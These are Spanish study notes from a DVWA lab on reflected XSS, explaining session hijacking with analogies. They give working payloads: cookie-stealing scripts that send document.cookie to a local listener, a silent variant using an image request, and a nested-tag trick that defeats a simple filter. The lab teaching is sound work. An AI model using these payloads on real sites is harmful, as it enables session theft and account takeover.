Vulnerabilidad donde el payload malicioso es incluido en la solicitud HTTP y reflejado inmediatamente en la respuesta del servidor, sin ser almacenado persistentemente. La ejecución ocurre mediante el engaño al usuario para que inicie una solicitud contaminada, comúnmente a través de enlaces manipulados.
**Analogía Estructurada**:  
_Correspondencia Fraudulenta Dirigida_: Un estafador envía una carta personalizada que requiere acción inmediata (como firmar un documento). La víctima, al realizar la acción solicitada, activa involuntariamente un mecanismo que compromete su seguridad. La carta no deja registro en el sistema postal después de su entrega.


```
<script>alert(document.cookie)</script>
```
![Pasted ima7](../images/Pasted%20image%2020251204011035.png)

**¿Qué significa esto?** Acabas de ejecutar código en tu propio navegador. Si esto fuera un ataque real, un hacker te enviaría un enlace con ese script oculto, y al hacer clic, tu navegador le enviaría tu cookie de sesión al atacante, permitiéndole robar tu cuenta.

Que te "roben la cookie" significa que un atacante puede **clonar tu sesión activa** y hacerse pasar por ti sin saber tu contraseña. Es lo que en ciberseguridad se llama **Session Hijacking** (Secuestro de Sesión) .

La Analogía: La Pulsera del Club 

Imagina que vas a una discoteca exclusiva.

1. **El Login:** En la entrada, el guardia te pide tu DNI (Usuario/Contraseña) para verificar que estás en la lista.
    
2. **La Cookie:** Una vez que comprueba quién eres, te pone una **pulsera VIP** (la Cookie de Sesión o `PHPSESSID`).
    
3. **La Navegación:** A partir de ese momento, para entrar a la zona VIP o pedir bebidas gratis, **ya no muestras tu DNI**. Solo muestras la muñeca con la pulsera. El camarero ve la pulsera y te sirve.

```
python3 -m http.server 1337
```

```
<script>window.location='http://127.0.0.1:1337/?cookie='+document.cookie</script>
```
![Pasted ima7](../images/Pasted%20image%2020251204013546.png)

```
<script>window.location='http://IP_DE_KALI:1337/cookie='+document.cookie</script>
```


Payload Silencioso
```
<script> new Image().src="http://192.168.122.1:1337/?cookie="+document.cookie; </script>
```
- **No serás redirigido.** Te quedarás en la página de DVWA como si nada hubiera pasado.
- Como el navegador intenta cargar una imagen que no existe, no verás nada visual (o quizás un icono de imagen rota muy pequeño), pero el código JavaScript se ejecutará invisiblemente

![Pasted ima7](../images/Pasted%20image%2020251204015157.png)

a nivel medio
```
<scr<script>ipt>alert(document.cookie)</script>
```
Esa es una técnica clásica de evasión llamada **"Nested Payload" (Carga anidada)**. Funciona porque el mecanismo de defensa del Nivel Medio en DVWA es un filtro simple y "perezoso".

Según el informe técnico, en el nivel Medium, DVWA implementa un filtro que busca la cadena `<script>` y la elimina (la reemplaza por un espacio vacío).

Aquí te explico paso a paso por qué tu payload `<scr<script>ipt>...` logra burlar esa defensa:

### 1. La Lógica del Servidor (El Defensor)

El código PHP del servidor usa una función (probablemente `str_replace`) que dice: _"Busca la palabra exacta `<script>` y bórrala"._

El problema es que este filtro **solo pasa una vez**. No es recursivo (no vuelve a revisar lo que queda después de borrar).

### 2. La Anatomía del Ataque

Cuando envías `<scr<script>ipt>alert(document.cookie)</script>`, esto es lo que sucede internamente:

1. **Entrada:** El servidor recibe la cadena: `... <scr` **`<script>`** `ipt> ...`
    
2. **El Filtro Actúa:** Encuentra la palabra prohibida en el centro (la que marqué en negrita) y la elimina.
    
3. **El Resultado:** Lo que estaba a la izquierda (`<scr`) y lo que estaba a la derecha (`ipt>`) se unen para llenar el hueco que dejó la palabra eliminada.
    
    - `<scr` + (vacío) + `ipt>` = **`<script>`**
        
4. **Ejecución:** El navegador recibe el código reconstruido `<script>alert(...)</script>` y lo ejecuta porque ya es válido de nuevo.
